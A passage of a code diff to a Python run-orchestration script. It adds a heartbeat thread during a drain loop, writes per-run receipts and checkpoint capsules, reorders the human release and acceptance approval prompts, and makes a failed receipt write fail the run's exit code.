                (record.get("rows") or record.get("units") or [])]
     wait_start = None if skip_drain else _governor_wait_line(
         log, ", ".join(unit_ids) if unit_ids else "nothing")
+    # E46, THE WAIT ITSELF, NARRATED. Started here rather than inside
+    # run_loop because the silence a person complained about spans the WHOLE
+    # drain (up to 25 rounds), and a heartbeat scoped to one round would go
+    # quiet in every gap between them. loop_bridge.run_node reaches it
+    # through run_heartbeat.current(), so nothing in between has to carry it.
+    # Started and stopped in a plain pair around the loop, exactly like
+    # wait_start and _governor_wait_close below it: the thread is a daemon,
+    # so an unhandled exception here ends the process and takes it with it,
+    # and wrapping 150 lines in a try purely to stop a daemon thread would
+    # reindent the whole drain for nothing.
+    beat = run_heartbeat.Heartbeat(interval=heartbeat_seconds,
+                                   bound_seconds=limit_seconds).start()
     for round_no in range(1, 1 if skip_drain else 26):
         # T2: the two revisions THIS ROUND ran between, for the attempt
         # trace's tree-state summary below; _head is cheap (git rev-parse)
@@ -2876,6 +3962,7 @@ def main(argv=None):
                         "piece(s) are unfinished" % len(remaining))
             break
         done_before, attempts_before = verified_now, attempts_now
+    beat.stop()
     if wait_start is not None:
         _governor_wait_close(log, wait_start)
     after = _head(cwd)
@@ -2938,7 +4025,8 @@ def main(argv=None):
     _report, _integrated, refused = build_report(record, claims, before,
                                                   after, changed,
                                                   log_path=log_path,
-                                                  loop_text=loop_text_all)
+                                                  loop_text=loop_text_all,
+                                                  cwd=cwd)
     cost_block = build_cost_block(
         claims, refused, loop_text_all,
         (datetime.datetime.now() - run_start).total_seconds(),
@@ -2948,7 +4036,8 @@ def main(argv=None):
                                                after, changed,
                                                log_path=log_path,
                                                loop_text=loop_text_all,
-                                               cost_block=cost_block)
+                                               cost_block=cost_block,
+                                               cwd=cwd)
 
     # THE TWO SCREENS, computed from the receipts above and nothing else,
     # and ONLY when this run actually integrated something. A run that
@@ -2973,6 +4062,18 @@ def main(argv=None):
         report += ("\n  release screen: %s" % release_result
                    if release_result else
                    "\n  no release screen: a plain change")
+        # E72.3: THE RECEIPT, at the end of the run and behind no new
+        # command or flag. Built from the same in-memory record and the
+        # same receipts the two screens above were built from, so the page
+        # a person opens, the record a machine reads and the block printed
+        # here cannot tell three different stories about one run. A receipt
+        # that fails to render returns its own problem string from
+        # write_screen and is printed as that string; it never fails the
+        # delivery it describes.
+        _receipt_path, _receipt_view, receipt_block = (
+            receipt_door.render_receipt_screen(record, receipts, run_dir,
+                                               before, after, log_path))
+        report += "\n" + receipt_block
         release_answer = loom.read_answer(run_dir, "release")
         # I3, THE THIRD AND FOURTH HUMAN MOMENTS: release and acceptance.
         # receipt_door's own acceptance_spec/release_spec (the exact specs
@@ -2986,15 +4087,20 @@ def main(argv=None):
         # (_recorded_answer_resolver, above), never the auto-pick default
         # _auto_resolver uses for intent and forcing-condition, because a
         # risky change or an unaccepted delivery is never auto-approved.
-        _human_moment(log, "acceptance",
-                     receipt_door.acceptance_spec(record, receipts, before,
-                                                  after, log_path),
-                     resolver=_recorded_answer_resolver(run_dir, "acceptance"))
+        # Posed in MOMENTS' own order (release, then acceptance): the release
+        # decision is about the risky change, the acceptance about the
+        # delivery that closes the chain, so the proxy run of 2026-09-04
+        # (docs/plan/runs/i3-loom-2026-09-04) that found them the other way
+        # round read the charter's order back rather than its own.
         if triggers:
             _human_moment(log, "release",
                          receipt_door.release_spec(record, receipts, triggers,
                                                    before, after, log_path),
                          resolver=_recorded_answer_resolver(run_dir, "release"))
+        _human_moment(log, "acceptance",
+                     receipt_door.acceptance_spec(record, receipts, before,
+                                                  after, log_path),
+                     resolver=_recorded_answer_resolver(run_dir, "acceptance"))
 
     print(report)
     log.note(report)
@@ -3045,7 +4151,31 @@ def main(argv=None):
     final_receipts = receipt_door.receipts_for(record, claims, refused,
                                                log_path)
     exit_code, exit_reason = _exit_code_for(final_receipts, refused)
+    # E73.2, THE LAST CHECKPOINT: run finished. run_dir is settled and the
+    # document on disk already carries every DONE and refusal this run is
+    # ever going to record, so the capsule written here is the one a
+    # --continue against an ALREADY-finished run would read (harmless: a
+    # run with nothing left pending reports "done" as its next action).
+    # It is written BEFORE the receipt because the receipt reads it (Q8).
+    _write_capsule(run_dir)
+
+    # E81, THE RECEIPT, and the last thing this process says. A run that
+    # reached here touched the target: the exit code alone proves nothing a
+    # stranger can open, and stdout scrolls away. A receipt that cannot be
+    # written is a failure of the delivery, not a footnote to it, so it
+    # takes the exit code away from zero and says why on the same line.
+    receipt_path, receipt_problem = _write_receipt(run_dir, final_receipts,
+                                                   report, log_path)
+    if receipt_problem:
+        exit_code = exit_code or 1
+        exit_reason = ("this run left no receipt, so nothing it did is "
+                       "provable from disk: %s (the delivery itself ended: "
+                       "%s)" % (receipt_problem, exit_reason))
     print("brother_run: exit %d: %s" % (exit_code, exit_reason))
+    if receipt_path:
+        print("brother_run: receipt: %s" % receipt_path)
+    else:
+        print("brother_run: no receipt: %s" % receipt_problem)
     return exit_code
 
 
